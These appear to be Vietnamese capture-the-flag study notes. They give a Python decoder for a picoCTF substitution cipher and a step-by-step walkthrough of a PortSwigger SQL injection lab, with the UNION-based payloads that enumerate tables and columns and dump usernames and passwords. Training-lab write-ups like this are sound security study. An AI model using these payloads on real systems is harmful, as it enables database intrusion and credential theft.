# Cryptography  
## picoCtf
substitution0 https://play.picoctf.org/practice/challenge/307?page=1&search=substitu
Cách giải: 
- Đây là mật mã thay thế.
- 26 kí tự đầu tiên sẽ là khóa.


- from string import *
- with open("message.txt") as file:
-    content = file.read()
- upper_key = "QWITJSYHXCNDFERMUKGOPVALBZ"
- lower_key = upper_key.lower()
- for character in content:
-     if character.isupper():
-         print(ascii_uppercase[upper_key.index(character)],end = "")
-     elif character.islower():
-         print(ascii_lowercase[lower_key.index(character)],end = "")
-     else: 
-         print(character,end = "")

#Web
## portwSwigger
- SQL Injection - Lab #9 SQL injection attack, listing the database contents on non Oracle databases
- https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle
1. Xác định số cột của database: ' order by 1--
- https://0a2200c8030727a2c633e1d0005c006d.web-security-academy.net/filter?category=Accessories%27%20order%20by%201--
- Tăng số lần lượt từ 1 cho đến khi web trả về lỗi. Từ đó xác định được số cột trong database.(2 cột)
2. Xác định kiểu dữ liệu của cột.
- ' UNION select 'a',NULL-- 
- ' UNION select 'a','a'--
- -> cả hai cột dữ liệu là kiểu text.
3. Xác định phiên bản của database.
- ' UNION select version(),NULL--       =>PostgreSQL
4. Lấy được danh sách tên cột của database.
- ' UNION select table_name, NULL FROM  information_schema.tables--
- (lên mạng gõ information_schema.tables sau đó tìm ra được table_name)  
5. In ra tên của bảng.
- ' UNION select column_name, NULL FROM  information_schema.columns WHERE table_name = 'users_wahylc'--
- (users_wahylc tùy thuộc vào từng bài).
- password_qlrxps     username_msmtmu
6. In ra username và password.
- ' UNION select username_msmtmu, password_qlrxps from users_wahylc--
- administrator   c05fnpuhr9l97equdrn2